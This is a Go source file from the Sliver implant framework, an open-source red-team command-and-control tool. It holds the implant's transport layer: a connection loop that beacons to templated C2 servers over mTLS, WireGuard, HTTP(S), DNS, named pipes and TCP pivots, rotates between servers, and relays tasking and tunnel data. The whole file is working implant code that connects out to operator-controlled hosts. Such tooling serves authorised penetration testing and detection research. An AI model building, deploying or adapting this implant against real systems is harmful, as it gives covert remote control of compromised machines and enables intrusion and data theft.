package transports

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"
	insecureRand "math/rand"

	// {{if or .Config.HTTPc2Enabled .Config.TCPPivotc2Enabled .Config.WGc2Enabled}}
	"net"
	// {{end}}

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	// {{if .Config.MTLSc2Enabled}}
	"github.com/bishopfox/sliver/implant/sliver/transports/dnsclient"
	"github.com/bishopfox/sliver/implant/sliver/transports/mtls"

	// {{end}}

	// {{if .Config.WGc2Enabled}}
	"errors"

	"github.com/bishopfox/sliver/implant/sliver/transports/wireguard"

	// {{end}}

	"io"
	"net/url"
	"strconv"
	"sync"
	"time"

	pb "github.com/bishopfox/sliver/protobuf/sliverpb"

	// {{if .Config.HTTPc2Enabled}}
	"github.com/bishopfox/sliver/implant/sliver/transports/httpclient"
	"google.golang.org/protobuf/proto"
	// {{end}}
	// {{if .Config.TCPPivotc2Enabled}}
	// {{end}}
)

var (
	maxErrors         = getMaxConnectionErrors()
	reconnectInterval = -1
	pollInterval      = -1

	ccCounter = new(int)

	activeC2         string
	activeConnection *Connection
	proxyURL         string
)

// Connection - Abstract connection to the server
type Connection struct {
	Send    chan *pb.Envelope
	Recv    chan *pb.Envelope
	IsOpen  bool
	ctrl    chan bool
	cleanup func()
	once    *sync.Once
	tunnels *map[uint64]*Tunnel
	mutex   *sync.RWMutex
}

// Cleanup - Execute cleanup once
func (c *Connection) Cleanup() {
	c.once.Do(func() {
		c.cleanup()
		c.IsOpen = false
	})
}

// Tunnel - Duplex byte read/write
type Tunnel struct {
	ID uint64

	Reader       io.ReadCloser
	ReadSequence uint64

	Writer        io.WriteCloser
	WriteSequence uint64
}

func init() {
	insecureRand.Seed(time.Now().UnixNano())
}

// Tunnel - Add tunnel to mapping
func (c *Connection) Tunnel(ID uint64) *Tunnel {
	c.mutex.RLock()
	defer c.mutex.RUnlock()
	return (*c.tunnels)[ID]
}

// AddTunnel - Add tunnel to mapping
func (c *Connection) AddTunnel(tun *Tunnel) {
	c.mutex.Lock()
	defer c.mutex.Unlock()

	(*c.tunnels)[tun.ID] = tun
}

// RemoveTunnel - Add tunnel to mapping
func (c *Connection) RemoveTunnel(ID uint64) {
	c.mutex.Lock()
	defer c.mutex.Unlock()
	delete(*c.tunnels, ID)
}

func (c *Connection) RequestResend(data []byte) {
	c.Send <- &pb.Envelope{
		Type: pb.MsgTunnelData,
		Data: data,
	}
}

// StartConnectionLoop - Starts the main connection loop
func StartConnectionLoop() *Connection {

	// {{if .Config.Debug}}
	log.Printf("Starting connection loop ...")
	// {{end}}

	connectionAttempts := 0
	for connectionAttempts < maxErrors {

		var connection *Connection
		var err error

		uri := nextCCServer()
		// {{if .Config.Debug}}
		log.Printf("Next CC = %s", uri.String())
		// {{end}}

		switch uri.Scheme {

		// *** MTLS ***
		// {{if .Config.MTLSc2Enabled}}
		case "mtls":
			connection, err = mtlsConnect(uri)
			if err == nil {
				activeC2 = uri.String()
				activeConnection = connection
				return connection
			}
			// {{if .Config.Debug}}
			log.Printf("[mtls] Connection failed %s", err)
			// {{end}}
			connectionAttempts++
			// {{end}}  - MTLSc2Enabled
		case "wg":
			// *** WG ***
			// {{if .Config.WGc2Enabled}}
			connection, err = wgConnect(uri)
			if err == nil {
				activeC2 = uri.String()
				activeConnection = connection
				return connection
			}
			// {{if .Config.Debug}}
			log.Printf("[wg] Connection failed %s", err)
			// {{end}}
			connectionAttempts++
			// {{end}}  - WGc2Enabled
		case "https":
			fallthrough
		case "http":
			// *** HTTP ***
			// {{if .Config.HTTPc2Enabled}}
			connection, err = httpConnect(uri)
			if err == nil {
				activeC2 = uri.String()
				activeConnection = connection
				return connection
			}
			// {{if .Config.Debug}}
			log.Printf("[%s] Connection failed %s", uri.Scheme, err)
			// {{end}}
			connectionAttempts++
			// {{end}} - HTTPc2Enabled

		case "dns":
			// *** DNS ***
			// {{if .Config.DNSc2Enabled}}
			connection, err = dnsConnect(uri)
			if err == nil {
				activeC2 = uri.String()
				activeConnection = connection
				return connection
			}
			// {{if .Config.Debug}}
			log.Printf("[dns] Connection failed %s", err)
			// {{end}}
			connectionAttempts++
			// {{end}} - DNSc2Enabled

		case "namedpipe":
			// *** Named Pipe ***
			// {{if .Config.NamePipec2Enabled}}
			connection, err = namedPipeConnect(uri)
			if err == nil {
				activeC2 = uri.String()
				activeConnection = connection
				return connection
			}
			// {{if .Config.Debug}}
			log.Printf("[namedpipe] Connection failed %s", err)
			// {{end}}
			connectionAttempts++
			// {{end}} -NamePipec2Enabled

		case "tcppivot":
			// {{if .Config.TCPPivotc2Enabled}}
			connection, err = tcpPivotConnect(uri)
			if err == nil {
				activeC2 = uri.String()
				activeConnection = connection
				return connection
			}
			// {{if .Config.Debug}}
			log.Printf("[tcppivot] Connection failed %s", err)
			// {{end}}
			connectionAttempts++
			// {{end}} -TCPPivotc2Enabled

		default:
			// {{if .Config.Debug}}
			log.Printf("Unknown c2 protocol %s", uri.Scheme)
			// {{end}}
		}

		reconnect := GetReconnectInterval()
		// {{if .Config.Debug}}
		log.Printf("Sleep %d second(s) ...", reconnect/time.Second)
		// {{end}}
		time.Sleep(reconnect)
	}
	// {{if .Config.Debug}}
	log.Printf("[!] Max connection errors reached\n")
	// {{end}}

	return nil
}

var ccServers = []string{
	// {{range $index, $value := .Config.C2}}
	"{{$value}}", // {{$index}}
	// {{end}}
}

// GetActiveC2 returns the URL of the C2 in use
func GetActiveC2() string {
	return activeC2
}

// GetProxyURL return the URL of the current proxy in use
func GetProxyURL() string {
	if proxyURL == "" {
		return "none"
	}
	return proxyURL
}

// GetActiveConnection returns the Connection of the C2 in use
func GetActiveConnection() *Connection {
	return activeConnection
}

func nextCCServer() *url.URL {
	var next string
	switch "{{.Config.ConnectionStrategy}}" {
	case "r": // Random
		next = ccServers[insecureRand.Intn(len(ccServers))]
	case "rd": // Random Domain
		next = randomCCDomain(ccServers[*ccCounter%len(ccServers)])
	case "s": // Sequential
		next = ccServers[*ccCounter%len(ccServers)]
	default:
		next = ccServers[*ccCounter%len(ccServers)]
	}
	*ccCounter++
	uri, err := url.Parse(next)
	if err != nil {
		return nextCCServer()
	}
	return uri
}

// randomCCDomain - Random selection within a protocol
func randomCCDomain(next string) string {
	uri, err := url.Parse(next)
	if err != nil {
		return next
	}
	pool := []string{}
	protocol := uri.Scheme
	for _, cc := range ccServers {
		uri, err := url.Parse(cc)
		if err != nil {
			continue
		}
		if uri.Scheme == protocol {
			pool = append(pool, cc)
		}
	}
	return pool[insecureRand.Intn(len(pool))]
}

// GetReconnectInterval - Parse the reconnect interval inserted at compile-time
func GetReconnectInterval() time.Duration {
	if reconnectInterval == -1 {
		reconnect, err := strconv.Atoi(`{{.Config.ReconnectInterval}}`)
		if err != nil {
			return 60 * time.Second
		}
		return time.Duration(reconnect) * time.Second
	} else {
		return time.Duration(reconnectInterval) * time.Second
	}
}

func SetReconnectInterval(interval int) {
	reconnectInterval = interval
}

// GetPollInterval - Parse the poll interval inserted at compile-time
func GetPollInterval() time.Duration {
	if pollInterval == -1 {
		pollInterval, err := strconv.Atoi(`{{.Config.PollInterval}}`)
		if err != nil {
			return 1 * time.Second
		}
		return time.Duration(pollInterval) * time.Second
	} else {
		return time.Duration(pollInterval) * time.Second
	}
}

func SetPollInterval(interval int) {
	pollInterval = interval
}

func getMaxConnectionErrors() int {
	maxConnectionErrors, err := strconv.Atoi(`{{.Config.MaxConnectionErrors}}`)
	if err != nil {
		return 1000
	}
	return maxConnectionErrors
}

// {{if .Config.MTLSc2Enabled}}
func mtlsConnect(uri *url.URL) (*Connection, error) {
	// {{if .Config.Debug}}
	log.Printf("Connecting -> %s", uri.Host)
	// {{end}}
	lport, err := strconv.Atoi(uri.Port())
	if err != nil {
		lport = 8888
	}
	conn, err := mtls.MtlsConnect(uri.Hostname(), uint16(lport))
	if err != nil {
		return nil, err
	}

	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan bool)
	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		IsOpen:  true,
		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[mtls] lost connection, cleanup...")
			// {{end}}
			close(send)
			conn.Close()
			close(recv)
		},
	}

	go func() {
		defer connection.Cleanup()
		for {
			select {
			case envelope, ok := <-send:
				if !ok {
					return
				}
				err := mtls.WriteEnvelope(conn, envelope)
				if err != nil {
					return
				}
			case <-time.After(mtls.PingInterval):
				mtls.WritePing(conn)
				if err != nil {
					return
				}
			}
		}
	}()

	go func() {
		defer connection.Cleanup()
		for {
			envelope, err := mtls.ReadEnvelope(conn)
			if err == io.EOF {
				break
			}
			if err != io.EOF && err != nil {
				break
			}
			if envelope != nil {
				recv <- envelope
			}
		}
	}()

	activeConnection = connection
	return connection, nil
}

// {{end}} -MTLSc2Enabled

// {{if .Config.WGc2Enabled}}
func wgConnect(uri *url.URL) (*Connection, error) {
	// {{if .Config.Debug}}
	log.Printf("Connecting -> %s", uri.Host)
	// {{end}}
	lport, err := strconv.Atoi(uri.Port())
	if err != nil {
		lport = 53
	}
	// Attempt to resolve the hostname in case
	// we received a domain name and not an IP address.
	// net.LookupHost() will still work with an IP address
	addrs, err := net.LookupHost(uri.Hostname())
	if err != nil {
		return nil, err
	}
	if len(addrs) == 0 {
		return nil, errors.New("{{if .Config.Debug}}Invalid address{{end}}")
	}
	hostname := addrs[0]
	conn, dev, err := wireguard.WireguardConnect(hostname, uint16(lport))
	if err != nil {
		return nil, err
	}

	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan bool)
	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		IsOpen:  true,
		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[wg] lost connection, cleanup...")
			// {{end}}
			close(send)
			conn.Close()
			dev.Down()
			close(recv)
		},
	}

	go func() {
		defer connection.Cleanup()
		for {
			select {
			case envelope, ok := <-send:
				if !ok {
					return
				}
				err := wireguard.WriteEnvelope(conn, envelope)
				if err != nil {
					return
				}
			case <-time.After(mtls.PingInterval):
				wireguard.WritePing(conn)
				if err != nil {
					return
				}
			}
		}
	}()

	go func() {
		defer connection.Cleanup()
		for {
			envelope, err := wireguard.ReadEnvelope(conn)
			if err == io.EOF {
				break
			}
			if err != io.EOF && err != nil {
				break
			}
			if envelope != nil {
				recv <- envelope
			}
		}
	}()

	activeConnection = connection
	return connection, nil
}

// {{end}} -WGc2Enabled

// {{if .Config.HTTPc2Enabled}}
func httpConnect(c2URI *url.URL) (*Connection, error) {

	// {{if .Config.Debug}}
	log.Printf("Connecting -> http(s)://%s", c2URI.Host)
	// {{end}}
	proxyConfig := c2URI.Query().Get("proxy")
	client, err := httpclient.HTTPStartSession(c2URI.Host, c2URI.Path, proxyConfig)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("http(s) connection error %v", err)
		// {{end}}
		return nil, err
	}
	proxyURL = client.ProxyURL

	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan bool, 1)
	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		IsOpen:  true,
		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[http] lost connection, cleanup...")
			// {{end}}
			close(send)
			ctrl <- true
			close(recv)
		},
	}

	go func() {
		defer connection.Cleanup()
		for envelope := range send {
			data, _ := proto.Marshal(envelope)
			// {{if .Config.Debug}}
			log.Printf("[http] send envelope ...")
			// {{end}}
			go client.Send(data)
		}
	}()

	go func() {
		defer connection.Cleanup()
		errCount := 0 // Number of sequential errors
		for {
			select {
			case <-ctrl:
				return
			default:
				resp, err := client.Poll()
				switch errType := err.(type) {
				case nil:
					errCount = 0
					if len(resp) == 0 {
						continue
					}
					envelope := &pb.Envelope{}
					err = proto.Unmarshal(resp, envelope)
					if err != nil {
						// {{if .Config.Debug}}
						log.Printf("failed to decode pb: %s", err)
						// {{end}}
						continue
					}
					recv <- envelope
				case *url.Error:
					errCount++
					if err, ok := errType.Err.(net.Error); ok && err.Timeout() {
						// {{if .Config.Debug}}
						log.Printf("timeout error #%d", errCount)
						// {{end}}
						if errCount < maxErrors {
							continue
						}
					}
					return
				case net.Error:
					errCount++
					if errType.Timeout() {
						// {{if .Config.Debug}}
						log.Printf("timeout error #%d", errCount)
						// {{end}}
						if errCount < maxErrors {
							continue
						}
					}
					return
				default:
					errCount++
					// {{if .Config.Debug}}
					log.Printf("[http] error: %#v", err)
					// {{end}}
					return
				}
			}
		}
	}()

	activeConnection = connection
	return connection, nil
}

// {{end}} -HTTPc2Enabled

// {{if .Config.DNSc2Enabled}}
func dnsConnect(uri *url.URL) (*Connection, error) {
	dnsParent := uri.Hostname()
	// {{if .Config.Debug}}
	log.Printf("Attempting to connect via DNS via parent: %s\n", dnsParent)
	// {{end}}
	sessionID, sessionKey, err := dnsclient.DnsConnect(dnsParent)
	if err != nil {
		return nil, err
	}
	// {{if .Config.Debug}}
	log.Printf("Starting new session with id = %s\n", sessionID)
	// {{end}}

	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan bool, 1)
	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		IsOpen:  true,
		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[dns] lost connection, cleanup...")
			// {{end}}
			close(send)
			ctrl <- true // Stop polling
			close(recv)
		},
	}

	go func() {
		defer connection.Cleanup()
		for envelope := range send {
			dnsclient.SendEnvelope(dnsParent, sessionID, sessionKey, envelope)
		}
	}()

	pollInterval := GetPollInterval()
	go func() {
		defer connection.Cleanup()
		dnsclient.Poll(dnsParent, sessionID, sessionKey, pollInterval, ctrl, recv)
	}()

	activeConnection = connection
	return connection, nil
}

// {{end}} - .DNSc2Enabled

// {{if .Config.TCPPivotc2Enabled}}
func tcpPivotConnect(uri *url.URL) (*Connection, error) {
	addr := fmt.Sprintf("%s:%s", uri.Hostname(), uri.Port())
	// {{if .Config.Debug}}
	log.Printf("Attempting to connect via TCP Pivot to: %s\n", addr)
	// {{end}}
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return nil, err
	}
	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan bool, 1)
	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		IsOpen:  true,
		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[tcp-pivot] lost connection, cleanup...")
			// {{end}}
			close(send)
			ctrl <- true
			close(recv)
		},
	}

	go func() {
		defer connection.Cleanup()
		for envelope := range send {
			// {{if .Config.Debug}}
			log.Printf("[tcp-pivot] send loop envelope type %d\n", envelope.Type)
			// {{end}}
			tcpPivotWriteEnvelope(&conn, envelope)
		}
	}()

	go func() {
		defer connection.Cleanup()
		for {
			envelope, err := tcpPivotReadEnvelope(&conn)
			if err == io.EOF {
				break
			}
			if err == nil {
				recv <- envelope
				// {{if .Config.Debug}}
				log.Printf("[tcp-pivot] Receive loop envelope type %d\n", envelope.Type)
				// {{end}}
			}
		}
	}()
	activeConnection = connection
	return connection, nil
}

// {{end}} -TCPPivotc2Enabled
